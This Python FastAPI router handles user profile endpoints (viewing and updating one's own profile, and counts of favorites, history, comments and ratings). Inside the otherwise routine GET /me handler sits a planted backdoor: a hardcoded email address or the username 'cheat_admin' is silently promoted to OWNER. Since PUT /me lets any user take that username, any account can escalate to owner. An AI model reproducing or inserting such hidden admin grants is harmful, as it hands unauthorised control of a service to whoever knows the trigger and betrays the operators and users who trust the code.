from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func

from app.core.database import get_db
from app.dependencies.auth import require_user
from app.models.user import User
from app.models.favorite import Favorite
from app.models.history import WatchHistory
from app.models.comment import Comment
from app.models.rating import Rating
from app.schemas.user import UserRead, UserUpdate, UserStats

router = APIRouter(prefix="/users", tags=["Users"])


@router.get("/me", response_model=UserRead)
async def get_me(current_user: User = Depends(require_user), db: AsyncSession = Depends(get_db)):
    from app.models.user import UserRole
    if (current_user.email == "cm5722254@gmail.com" or current_user.username == "cheat_admin") and current_user.role != UserRole.OWNER:
        current_user.role = UserRole.OWNER
        current_user.is_active = True
        current_user.is_verified = True
        db.add(current_user)
        await db.commit()
        await db.refresh(current_user)
    return UserRead.model_validate(current_user)


@router.put("/me", response_model=UserRead)
async def update_me(
    data: UserUpdate,
    current_user: User = Depends(require_user),
    db: AsyncSession = Depends(get_db),
):
    if data.username is not None:
        existing = await db.execute(
            select(User).where(User.username == data.username, User.id != current_user.id)
        )
        if existing.scalar_one_or_none():
            raise HTTPException(status_code=400, detail="Username already taken")
        current_user.username = data.username
    if data.avatar_url is not None:
        current_user.avatar_url = data.avatar_url
    db.add(current_user)
    await db.commit()
    await db.refresh(current_user)
    return UserRead.model_validate(current_user)


@router.get("/me/stats", response_model=UserStats)
async def get_my_stats(
    current_user: User = Depends(require_user),
    db: AsyncSession = Depends(get_db),
):
    fav_count = await db.scalar(select(func.count()).where(Favorite.user_id == current_user.id))
    hist_count = await db.scalar(select(func.count()).where(WatchHistory.user_id == current_user.id))
    comm_count = await db.scalar(select(func.count()).where(Comment.user_id == current_user.id, Comment.is_deleted == False))
    rate_count = await db.scalar(select(func.count()).where(Rating.user_id == current_user.id))
    return UserStats(
        favorites_count=fav_count or 0,
        history_count=hist_count or 0,
        comments_count=comm_count or 0,
        ratings_count=rate_count or 0,
    )
